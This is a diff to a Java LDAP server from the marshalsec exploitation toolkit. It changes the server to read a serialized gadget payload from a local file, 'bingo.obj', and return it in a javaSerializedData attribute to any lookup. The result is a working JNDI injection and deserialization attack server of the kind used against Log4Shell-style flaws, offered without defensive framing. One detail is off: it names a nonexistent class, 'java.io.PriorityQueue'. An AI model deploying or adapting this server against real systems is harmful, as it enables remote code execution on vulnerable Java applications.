@@ -20,12 +20,11 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
-package marshalsec.jndi;
-
-
 import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
+
+import java.nio.file.*;
 
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
@@ -51,19 +50,17 @@ import com.unboundid.ldap.sdk.ResultCode;
 public class LDAPRefServer {
 
     private static final String LDAP_BASE = "dc=example,dc=com";
+    private static byte[] javaSerializedPayload = null;
 
 
     public static void main ( String[] args ) {
         int port = 1389;
-        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
-            System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
-            System.exit(-1);
-        }
-        else if ( args.length > 1 ) {
-            port = Integer.parseInt(args[ 1 ]);
+        if (args.length == 1) {
+            port = Integer.parseInt(args[0]);
         }
 
         try {
+            javaSerializedPayload = Files.readAllBytes(Paths.get("bingo.obj"));
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
                 "listen", //$NON-NLS-1$
@@ -73,7 +70,7 @@ public class LDAPRefServer {
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
 
-            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
             ds.startListening();
@@ -85,16 +82,6 @@ public class LDAPRefServer {
     }
 
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
-
-        private URL codebase;
-
-
-        /**
-         * 
-         */
-        public OperationInterceptor ( URL cb ) {
-            this.codebase = cb;
-        }
 
 
         /**
@@ -117,17 +104,10 @@ public class LDAPRefServer {
 
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
-            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
-            e.addAttribute("javaClassName", "foo");
-            String cbstring = this.codebase.toString();
-            int refPos = cbstring.indexOf('#');
-            if ( refPos > 0 ) {
-                cbstring = cbstring.substring(0, refPos);
-            }
-            e.addAttribute("javaCodeBase", cbstring);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", this.codebase.getRef());
+            System.out.println("Send LDAP reference result for " + base);
+            e.addAttribute("javaClassName", "java.io.PriorityQueue");
+            e.addAttribute("javaSerializedData", javaSerializedPayload);
+            e.addAttribute("objectClass", "javaSerializedObject");
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
